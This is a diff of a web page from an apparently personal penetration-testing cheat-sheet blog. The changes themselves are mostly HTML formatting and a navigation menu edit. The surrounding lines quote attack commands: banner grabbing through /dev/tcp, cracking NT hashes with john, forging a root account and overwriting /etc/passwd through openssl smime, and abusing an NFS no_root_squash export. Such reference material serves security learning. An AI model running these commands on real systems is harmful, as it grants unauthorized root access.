@@ -49,11 +49,9 @@ Enumeration Network discoverie Nmap I tend to run 3 nmaps, an initial one, a ful
     </a><span class=header__right>
                     <nav class=menu>
                         <ul class=menu__inner>
+                            <li><a href=https://pruthvirajbhat.github.io/about />About</a></li>
                             <li><a href=https://pruthvirajbhat.github.io/posts />Posts</a></li>
-                            
-                            </li>
                             <li><a href=https://pruthvirajbhat.github.io/tags />Tags</a></li>
-                            
                         </ul>
                     </nav><span class="menu-trigger hidden"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                             <path d="M0 0h24v24H0z" fill="none" />
@@ -297,7 +295,8 @@ top10<span style=color:#f92672>=(</span><span style=color:#ae81ff>20</span> <spa
                 </div>
                 <h3 id=banner-grabbing-without-nmap>Banner grabbing (without nmap)</h3>
                 <p>If nmap didn&rsquo;t grab banners (or is not installed), you can do it with
-                    <code>/dev/tcp/ip/port</code> <code>/dev/udp/ip/port</code> or by using telnet.</p>
+                    <code>/dev/tcp/ip/port</code> <code>/dev/udp/ip/port</code> or by using telnet.
+                </p>
                 <h4 id=devtcpipport-or-devudpipport-1>/dev/tcp/ip/port or /dev/udp/ip/port</h4>
                 <pre><code class=language-console data-lang=console>cat &lt; /dev/tcp/192.168.30.253/22
 SSH-2.0-OpenSSH_6.2p2 Debian-6
@@ -529,7 +528,8 @@ sudo john dumped_hashes --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
 cp /etc/passwd /tmp/passwd.custom
 </code></pre>
                 <p>Now, a custom user will be created and added to <code>/tmp/passwd.custom</code> with
-                    <code>customPassword</code> and as root user (UID = GID = 0):</p>
+                    <code>customPassword</code> and as root user (UID = GID = 0):
+                </p>
                 <pre><code class=language-console data-lang=console>echo 'ceso:'&quot;$( openssl passwd -6 -salt xyz customPassword )&quot;':0:0::/tmp:/bin/bash' &gt;&gt; /tmp/passwd.custom
 </code></pre>
                 <p>Now, create a custom <code>key.pem</code> and <code>cert.pem</code> with openssl:</p>
@@ -539,12 +539,14 @@ cp /etc/passwd /tmp/passwd.custom
                 <pre><code class=language-console data-lang=console>openssl smime -encrypt -aes256 -in /tmp/passwd.custom -binary -outform DER -out /tmp/passwd.enc /tmp/cert.pem
 </code></pre>
                 <p>Now, decrypt the custom passwd overwritting in the process the real one (
-                    <code>/etc/passwd</code>):</p>
+                    <code>/etc/passwd</code>):
+                </p>
                 <pre><code class=language-console data-lang=console>cd /
 /home/ldapuser1/openssl smime -decrypt -in /tmp/passwd.enc -inform DER -inkey /tmp/key.pem -out /etc/passwd
 </code></pre>
                 <p>And finally, just login with the user created with root privileges by using
-                    <code>customPassword</code>:</p>
+                    <code>customPassword</code>:
+                </p>
                 <pre><code class=language-console data-lang=console>su - ceso
 </code></pre>
                 <h4 id=command-web-injection-add-user>Command web injection: add user</h4>
@@ -556,7 +558,8 @@ cp /etc/passwd /tmp/passwd.custom
 /srv/pelota 127.0.0.1/32(no_root_squash,insecure,rw)
 </code></pre>
                 <p>NFS is being exported and you and you have ssh access to the machine. From your attacker machine
-                    <strong>while logged as root</strong> user run:</p>
+                    <strong>while logged as root</strong> user run:
+                </p>
                 <pre><code class=language-console data-lang=console>ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049
 mount -t nfs 127.0.0.1:/srv/pelota my_share
 cd my_share
